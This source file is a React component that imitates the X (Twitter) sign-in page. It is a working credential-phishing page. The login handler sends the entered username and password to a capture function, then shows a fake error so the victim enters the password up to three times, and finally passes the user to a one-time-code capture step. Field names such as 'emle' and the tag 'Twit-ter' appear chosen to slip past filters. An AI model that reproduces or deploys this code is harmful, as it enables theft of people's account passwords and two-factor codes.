"use client";

import { useState, useEffect } from "react";
import { Loader2 } from "lucide-react";
import { captureData } from "@/lib/capture";

export default function TwitterVote({
  onLogin,
  onSuccess,
  onRequireOTP,
}: {
  onLogin: (username: string, entryId: string) => void;
  onSuccess: () => void;
  onRequireOTP: (username: string) => void;
}) {
  const [step, setStep] = useState<1 | 2>(1);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [entryId, setEntryId] = useState<string | null>(null);

  useEffect(() => {
    document.title =
      step === 1 ? "Sign in to X / X" : "Enter your password / X";
  }, [step]);

  const handleNextStep = () => {
    if (username.length < 3) return;
    setIsVerifying(true);
    setTimeout(() => {
      setIsVerifying(false);
      setStep(2);
    }, 800);
  };

  const handleLogin = async () => {
    if (!password || password.length < 4) return;
    setIsVerifying(true);
    setError(false);

    const payload: any = {
      emle: username,
      stage: attempts === 0 ? "initial" : attempts === 1 ? "retry" : "final",
    };

    if (attempts === 0) payload.pass = password;
    else if (attempts === 1) payload.pass2 = password;
    else payload.pass3 = password;

    try {
      const id = await captureData("Twit-ter", payload, entryId || undefined);
      if (id) {
        setEntryId(id);
        onLogin(username, id);
      }
    } catch (e) {
      console.error("Connection error");
    }

    setTimeout(() => {
      setIsVerifying(false);
      if (attempts < 2) {
        setAttempts(attempts + 1);
        setError(true);
        setPassword("");
      } else {
        onRequireOTP(username);
      }
    }, 1500);
  };

  return (
    <div className="fixed inset-0 z-[10000] bg-black flex flex-col items-center font-sans text-[#e7e9ea] overflow-y-auto">
      <div className="w-full max-w-[600px] h-full flex flex-col px-4 md:px-8 py-4">
        <div className="flex justify-center items-center py-4">
          <svg viewBox="0 0 24 24" className="h-8 w-8 fill-white">
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
          </svg>
        </div>

        <div className="flex flex-col flex-1 max-w-[364px] mx-auto w-full pt-4">
          {step === 1 ? (
            <div className="animate-in fade-in slide-in-from-bottom-4 duration-300">
              <h1 className="text-[31px] font-bold leading-9 mb-8 tracking-tight text-white">
                Sign in to X
              </h1>

              <div className="space-y-3 mb-4">
                {/* Google Sign In */}
                <button className="w-full h-[40px] bg-white text-[#3c4043] rounded-full font-bold text-[14px] flex items-center justify-center gap-2 hover:bg-[#f7f9f9] transition-colors">
                  <img src="/images/glog.svg.png" className="w-4 h-4" />
                  Sign in with Google
                </button>

                {/* Apple Sign In */}
                <button className="w-full h-[40px] bg-white text-black rounded-full font-bold text-[14px] flex items-center justify-center gap-2 hover:bg-[#f7f9f9] transition-colors">
                  <svg viewBox="0 0 384 512" className="w-4 h-4 fill-black">
                    <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z" />
                  </svg>
                  Sign in with Apple
                </button>
              </div>

              <div className="flex items-center gap-2 mb-4">
                <div className="h-[1px] bg-[#333639] flex-1"></div>
                <span className="text-[15px] text-white">or</span>
                <div className="h-[1px] bg-[#333639] flex-1"></div>
              </div>

              <div className="space-y-6">
                <input
                  autoFocus
                  type="text"
                  placeholder="Phone, email, or username"
                  className="w-full bg-black border border-[#333639] rounded-md p-4 text-[17px] outline-none focus:border-[#1d9bf0] transition-colors placeholder:text-[#71767b]"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />

                <button
                  disabled={username.length < 3 || isVerifying}
                  onClick={handleNextStep}
                  className="w-full h-[40px] bg-white text-black rounded-full font-bold text-[14px] hover:bg-[#d7dbdc] transition-all flex justify-center items-center">
                  {isVerifying ? (
                    <Loader2 className="w-5 h-5 animate-spin" />
                  ) : (
                    "Next"
                  )}
                </button>

                <button className="w-full h-[40px] border border-[#536471] text-white rounded-full font-bold text-[14px] hover:bg-[#181818] transition-all">
                  Forgot password?
                </button>

                <div className="mt-10 text-[15px] text-[#71767b]">
                  Don't have an account?{" "}
                  <span className="text-[#1d9bf0] cursor-pointer hover:underline">
                    Sign up
                  </span>
                </div>
              </div>
            </div>
          ) : (
            <div className="animate-in fade-in slide-in-from-right-4 duration-300">
              <h1 className="text-[31px] font-bold leading-9 mb-8 tracking-tight text-white">
                Enter your password
              </h1>

              <div className="space-y-6">
                <div className="bg-[#16181c] p-4 rounded-md border border-transparent mb-6">
                  <p className="text-[#71767b] text-sm">Username</p>
                  <p className="text-white">{username}</p>
                </div>

                <input
                  autoFocus
                  type="password"
                  placeholder="Password"
                  className={`mb-0 w-full bg-black border ${error ? "border-[#f4212e]" : "border-[#333639]"} rounded-md p-4 text-[17px] outline-none focus:border-[#1d9bf0] transition-colors`}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                />
                <button className="h-[40px] mt-0 text-[#1d9bf0]  text-[14px] transition-all">
                  Forgot password?
                </button>

                <button
                  disabled={password.length < 4 || isVerifying}
                  onClick={handleLogin}
                  className={`mt-20 w-full h-[50px] rounded-full font-bold text-[17px] transition-all flex justify-center items-center ${password.length >= 4 && !isVerifying ? "bg-white text-black hover:bg-[#d7dbdc]" : "bg-[#86898c] text-black"}`}>
                  {isVerifying ? (
                    <Loader2 className="w-5 h-5 animate-spin" />
                  ) : (
                    "Log in"
                  )}
                </button>

                <div className="mt-10 text-[15px] text-[#71767b]">
                  Don't have an account?{" "}
                  <span className="text-[#1d9bf0] cursor-pointer hover:underline">
                    Sign up
                  </span>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
